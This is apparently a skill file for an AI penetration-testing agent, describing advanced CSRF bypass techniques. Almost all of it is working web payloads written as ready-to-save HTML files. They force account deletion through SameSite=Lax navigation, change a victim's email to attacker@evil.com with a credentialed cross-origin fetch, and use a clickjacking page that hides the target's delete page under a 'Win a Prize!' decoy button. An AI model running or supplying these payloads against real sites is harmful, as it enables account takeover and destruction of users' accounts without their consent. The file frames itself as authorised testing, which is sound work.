---
name: vuln-csrf-advanced
description: "Advanced CSRF bypass — SameSite cookie bypass via navigation, click-jacking chain, CSRF via Flash redirect, subdomain CSRF bypass, sibling domain CSRF, browser-based CSRF bypass via service worker. Triggers: 'csrf advanced', 'samesite lax bypass', 'csrf navigation', 'csrf samesite bypass', 'sibling domain csrf', 'csrf via redirect', 'advanced csrf', 'csrf clickjacking'."
---

# Advanced CSRF Bypass Techniques

Bypass modern SameSite and CSRF token protections via browser quirks and domain trust.

---

## Phase 1: SameSite=Lax Bypass

```bash
TARGET="https://TARGET"

cat > output/csrf_lax_get_poc.html << 'EOF'
<html>
<body>
<script>
// Top-level navigation carries SameSite=Lax cookies
window.location = "https://TARGET/api/account/delete?confirm=true";
</script>
</body>
</html>
EOF

```

---

## Phase 2: SameSite=None Bypass

```bash
TARGET="https://TARGET"

curl -s "http://TARGET/api/change-email" -c /tmp/cookies.txt
grep -i "samesite" /tmp/cookies.txt

cat > output/csrf_none_cors_poc.html << 'EOF'
<html>
<script>
fetch("https://TARGET/api/account/settings", {
  method: "POST",
  credentials: "include",
  mode: "cors",
  body: JSON.stringify({email: "attacker@evil.com"}),
  headers: {"Content-Type": "application/json"}
});
</script>
</html>
EOF
```

---

## Phase 3: Subdomain/Sibling Domain CSRF

```bash
TARGET="https://TARGET"

cat > output/csrf_window_poc.html << 'EOF'
<html>
<script>
// Open target in new window — carries cookies on navigation
var w = window.open("https://TARGET/csrf-vulnerable-endpoint?action=delete", "_blank");
</script>
</html>
EOF
```

---

## Phase 4: CSRF with Clickjacking

```bash
TARGET="https://TARGET"

cat > output/csrf_clickjacking_poc.html << 'EOF'
<html>
<style>
iframe {
  width: 500px;
  height: 500px;
  position: absolute;
  top: 0;
  left: 0;
  opacity: 0.01;  /* invisible */
  z-index: 2;
}
button {
  position: absolute;
  top: 300px;
  left: 200px;
  z-index: 1;
}
</style>
<body>
<iframe src="https://TARGET/account/delete"></iframe>
<button>Win a Prize!</button>
</body>
</html>
EOF

```

---

## Output

Save to `output/`:
- `csrf_lax_get_poc.html` — GET-based SameSite=Lax bypass
- `csrf_none_cors_poc.html` — SameSite=None + CORS bypass
- `csrf_clickjacking_poc.html` — clickjacking CSRF chain

## Next Phase

→ `vuln-csrf` for basic CSRF first if not already done
→ `pentest-report` to document findings
